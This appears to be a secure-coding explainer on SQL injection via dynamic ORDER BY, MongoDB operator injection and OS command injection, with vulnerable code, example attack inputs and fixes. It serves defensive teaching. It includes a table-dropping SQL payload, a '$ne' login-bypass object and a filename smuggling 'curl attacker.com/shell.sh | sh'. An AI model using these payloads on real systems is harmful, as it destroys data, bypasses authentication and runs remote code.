🔥 1️⃣️“If we use prepared statements everywhere, can SQL injection still happen?”?”
🏗️ Architecture
User → API → SQL database (e.g., MySQL)
Developer uses parameterized queries:
SELECT * FROM users WHERE username = ?;
Safe, right?
Mostly.
But look at this:
query = "SELECT * FROM users ORDER BY " + request.args["sort"]
They only parameterized WHERE clauses.

💣 What’s happening internally?
Prepared statements protect data values, not SQL keywords, table names, column names, or operators.
If attacker supplies:
sort = username DESC; DROP TABLE users; --
The final query becomes:
SELECT * FROM users ORDER BY username DESC; DROP TABLE users; --

Database parses full string before execution.
Boom.

🧠 Key Insight
Prepared statements do NOT protect:
	• ORDER BY
	• LIMIT
	• Table names
	• Column names
	• Entire dynamic query construction
They only protect bound parameters.

🛡️ Proper Mitigation
	• Never concatenate SQL fragments.
	• Use strict allowlists:

if sort not in ["username", "email", "created_at"]:
    reject()

Summary:
	SQL injection is about mixing code and data.
	Prepared statements separate them — but only where used.

🔥 2️⃣️“Why does NoSQL injection happen even though there’s no SQL?”?”
🏗️ Architecture
User → API → MongoDB
Developer writes:
db.users.find({
  username: req.body.username,
  password: req.body.password
})
Looks clean.

💣 What attacker sends
Instead of:
{
  "username": "admin",
  "password": "password123"
}

Attacker sends:
{
  "username": "admin",
  "password": { "$ne": null }
}

🧠 What Happens Internally?
MongoDB interprets JSON as query operators.
$ne = not equal.

Query becomes:
Find user where:
username = admin
AND password != null
Authentication bypass.
No password needed.

💡 Why This Happens
Developer assumes input is a string.
But MongoDB treats JSON objects as query syntax.
The database language is JSON itself.
Attacker injects operators.

🛡️ Fix
Force types before query:

if (typeof req.body.password !== "string") reject();
Or explicitly wrap values:

db.users.find({
  username: String(req.body.username),
  password: String(req.body.password)
})

🔥 3️⃣️“Why is escaping shell arguments NOT enough for OS Command Injection?”?”
🏗️ Architecture
User uploads file → Backend scans with antivirus:

os.system("clamscan " + filename)
Developer fixes it:

os.system("clamscan " + shlex.quote(filename))
They feel safe.

💣 Attack
Attacker uploads file named:
file.txt; curl attacker.com/shell.sh | sh
If quoting is done incorrectly or if shell is still invoked:
The shell interprets:
	• ;
	• &&
	• |
	• backticks
	• $()
Because os.system() invokes /bin/sh.

🧠 What’s Actually Happening?
When using:
os.system()
The command is passed to a shell interpreter.
Shell parses metacharacters.
Even if escaping is imperfect — attacker wins.

🛡️ Real Fix
Never invoke shell.
Use direct system calls:
subprocess.run(["clamscan", filename], shell=False)
Now:
	• No shell parsing
	• No metacharacter interpretation
	• Arguments passed directly

Summary:
	OS command injection is shell injection.
	Remove the shell — remove the vulnerability class.




🧠 Master Mental Model for All Injection Types
All injection vulnerabilities follow the same law:

1. Application builds a command/query as a string
2. User input is concatenated into it
3. That string is interpreted by another engine
4. Engine executes attacker-controlled instructions
The interpreter might be:
	• SQL engine → SQL injection
	• MongoDB engine → NoSQL injection
	• Shell → OS command injection
	• Template engine → SSTI
Same root cause:
Code + Data mixed before interpretation.

